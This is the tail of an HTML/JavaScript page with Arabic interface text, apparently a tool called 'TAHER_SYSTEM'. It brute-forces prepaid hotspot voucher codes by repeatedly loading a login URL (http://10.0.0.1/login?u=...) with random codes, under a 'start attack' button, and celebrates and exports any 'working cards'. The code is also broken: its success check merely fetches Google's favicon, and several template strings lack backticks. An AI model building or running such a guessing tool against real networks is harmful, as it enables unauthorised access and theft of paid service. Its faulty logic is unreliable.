        }
        .neon-border::before {
            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(transparent, var(--yem-red), transparent, var(--yem-green), transparent, var(--yem-gold), transparent);
            animation: rotate 4s linear infinite;
        }
        @keyframes rotate { 100% { transform: rotate(360deg); } }

        .inner-content { background: #080808; border-radius: 10px; padding: 20px; position: relative; z-index: 5; }

        /* شريط الإحصائيات */
        .stat-bar {
            display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 15px;
            border-bottom: 1px solid #222; padding-bottom: 10px;
        }
        .stat-item { text-align: center; background: #111; padding: 5px; border-radius: 4px; border: 1px solid #222; }
        .stat-label { font-size: 9px; color: #555; display: block; }
        .stat-value { font-size: 14px; color: var(--yem-gold); font-weight: bold; }

        /* منطقة الكرت والهز */
        .nano-display {
            background: #000; border: 1px solid #222; border-radius: 8px;
            padding: 15px; text-align: center; margin-bottom: 15px;
        }
        #active-code { font-size: 28px; font-weight: bold; text-shadow: 0 0 10px var(--yem-green); }
        .shaking { animation: fast-shake 0.1s infinite; color: var(--yem-red) !important; }
        @keyframes fast-shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -1px); } 100% { transform: translate(1px, -1px); } }

        /* الأزرار المنسقة */
        .btns-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .btn { padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-family: inherit; transition: 0.2s; font-size: 13px; }
        .btn-start { background: var(--yem-red); color: white; }
        .btn-stop { background: #222; color: #fff; }
        .btn-report { background: var(--yem-gold); color: #000; grid-column: span 2; margin-top: 5px; }
        .btn:hover { filter: brightness(1.2); transform: scale(1.01); }

        /* نافذة النجاح (Pop-up) */
        #win-overlay {
            position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.9);
            display: none; justify-content: center; align-items: center; z-index: 1000;
        }
        .win-card {
            background: #111; border: 2px solid var(--yem-gold); padding: 40px; border-radius: 15px;
            text-align: center; box-shadow: 0 0 50px var(--yem-gold); position: relative;
        }

/* تأثير العملات المتطايرة */
        .coin { position: absolute; font-size: 24px; animation: fly 2s linear forwards; }
        @keyframes fly { 
            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
            100% { transform: translateY(-500px) rotate(360deg); opacity: 0; }
        }

        /* حقل النسخ */
        .copy-box {
            background: #000; border: 1px dashed var(--yem-gold); padding: 15px;
            margin: 20px 0; font-size: 25px; color: var(--yem-gold); font-weight: bold; cursor: pointer;
        }

        .view-frame { height: 400px; background: #fff; border-radius: 8px; overflow: hidden; border: 2px solid #111; margin-top: 10px; }
        iframe { width: 100%; height: 100%; border: none; }
        .log-box { height: 100px; background: #000; padding: 10px; overflow-y: auto; font-family: monospace; font-size: 11px; color: #444; border: 1px solid #111; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="neon-border">
        <div class="inner-content">
            <div class="stat-bar">
                <div class="stat-item"><span class="stat-label">محاولات</span><span class="stat-value" id="count">0</span></div>
                <div class="stat-item"><span class="stat-label">الحالة</span><span class="stat-value" id="status" style="color:var(--yem-green)">جاهز</span></div>
                <div class="stat-item"><span class="stat-label">صيد ثمين</span><span class="stat-value" id="wins">0</span></div>
                <div class="stat-item"><span class="stat-label">الدقة</span><span class="stat-value" id="percent">0%</span></div>
            </div>

            <div class="nano-display">
                <div id="active-code">TAHER_SYSTEM</div>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                <input type="text" id="target" value="http://10.0.0.1/login" style="background:#000; border:1px solid #222; color:var(--yem-green); padding:8px; border-radius:4px;">
                <input type="text" id="prefix" value="9h" style="background:#000; border:1px solid #222; color:var(--yem-green); padding:8px; border-radius:4px;">
            </div>

            <div class="btns-grid">
                <button class="btn btn-start" id="startBtn" onclick="Core.run()">بدء الهجوم</button>
                <button class="btn btn-stop" onclick="Core.stop()">إيقاف</button>
                <button class="btn btn-report" onclick="Core.saveReport()">تحميل تقرير الكروت الناجحة (TXT)</button>
            </div>
        </div>
    </div>

    <div class="neon-border">
        <div class="inner-content">
            <div class="view-frame"><iframe id="net-frame"></iframe></div>
        </div>
    </div>

    <div class="log-box" id="logger">> بانتظار الأوامر يا طاهر...</div>
</div>

<div id="win-overlay">
    <div class="win-card">
        <h2 style="color:var(--yem-gold); margin:0;">مبروك يا طاهر! تم الصيد 🦅</h2>
        <p style="color:#aaa; font-size:12px;">تم التحقق من الكرت وهو يعمل الآن</p>
        <div class="copy-box" id="win-code" onclick="Core.copyCode()">----</div>
        <p style="font-size:10px; color:var(--yem-green);">انقر على الكرت للنسخ فوزاً</p>
        <button class="btn btn-stop" onclick="Core.closeWin()" style="width:100%">إغلاق ومتابعة</button>
    </div>
</div>

<script>
    const Core = {
        active: false,
        attempts: 0,
        winList: [],
        audio: new (window.AudioContext || window.webkitAudioContext)(),

        log(m, c = "#444") {
            const l = document.getElementById('logger');
            l.innerHTML = <div><span style="color:${c}">> ${m}</span></div> + l.innerHTML;
        },

        spawnCoins() {
            for(let i=0; i<20; i++) {
                const coin = document.createElement('div');

coin.className = 'coin';
                coin.innerHTML = '💰';
                coin.style.left = Math.random() * 100 + '%';
                coin.style.animationDelay = Math.random() * 1 + 's';
                document.querySelector('.win-card').appendChild(coin);
                setTimeout(() => coin.remove(), 2000);
            }
        },

        async run() {
            if(this.active) return;
            this.active = true;
            document.getElementById('startBtn').disabled = true;
            document.getElementById('status').innerText = "هجوم..";
            document.getElementById('status').style.color = "var(--yem-red)";

            while(this.active) {
                this.attempts++;
                const code = this.gen();
                const display = document.getElementById('active-code');
                display.innerText = code;
                display.classList.add('shaking');
                document.getElementById('count').innerText = this.attempts;
                document.getElementById('percent').innerText = (this.attempts % 100) + "%";

                const success = await this.check(code);
                display.classList.remove('shaking');

                if(success) {
                    this.winList.push(code);
                    document.getElementById('wins').innerText = this.winList.length;
                    this.showWin(code);
                    this.stop();
                    break;
                }
                await new Promise(r => setTimeout(r, 2000));
            }
        },

        async check(c) {
            const f = document.getElementById('net-frame');
            f.src = document.getElementById('target').value + ?u=${c};
            return new Promise(r => {
                setTimeout(async () => {
                    try { await fetch('https://www.google.com/favicon.ico', {mode:'no-cors'}); r(true); }
                    catch { r(false); }
                }, 1500);
            });
        },

        showWin(code) {
            document.getElementById('win-overlay').style.display = 'flex';
            document.getElementById('win-code').innerText = code;
            this.spawnCoins();
            this.log("صيد ناجح: " + code, "var(--yem-gold)");
        },

        copyCode() {
            const code = document.getElementById('win-code').innerText;
            navigator.clipboard.writeText(code);
            alert("تم نسخ الكرت: " + code);
        },

        saveReport() {
            if(this.winList.length === 0) return alert("لا توجد كروت ناجحة حتى الآن!");
            const blob = new Blob([this.winList.join('\n')], {type: 'text/plain'});
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = تقرير_طاهر_الناجح_${new Date().toLocaleDateString()}.txt;
            a.click();
        },

        gen() {
            let s = document.getElementById('prefix').value;
            while(s.length < 10) s += Math.floor(Math.random()*10);
            return s;
        },

        closeWin() { document.getElementById('win-overlay').style.display = 'none'; },
        stop() {
            this.active = false;
            document.getElementById('startBtn').disabled = false;
            document.getElementById('status').innerText = "متوقف";
            document.getElementById('status').style.color = "var(--yem-green)";
        }
    };
</script>

</body>
</html>

